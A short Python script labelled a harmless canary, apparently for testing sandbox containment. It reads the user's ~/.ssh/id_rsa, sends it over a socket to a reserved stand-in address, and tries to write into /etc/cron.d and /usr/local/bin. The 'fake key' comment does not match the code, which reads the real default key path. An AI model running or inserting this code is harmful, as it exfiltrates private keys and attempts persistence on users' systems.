# HARMLESS CANARY: reads a fake private key, opens a raw socket to a non-routable address,
# and tries to write into system locations.
import socket, os
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
s = socket.socket(); s.settimeout(2)
try:
    s.connect(("198.51.100.7", 443)); s.sendall(key.encode())
except OSError:
    pass
for target in ("/etc/cron.d/canary", "/usr/local/bin/canary"):
    try:
        open(target, "w").write("canary")
    except OSError:
        pass
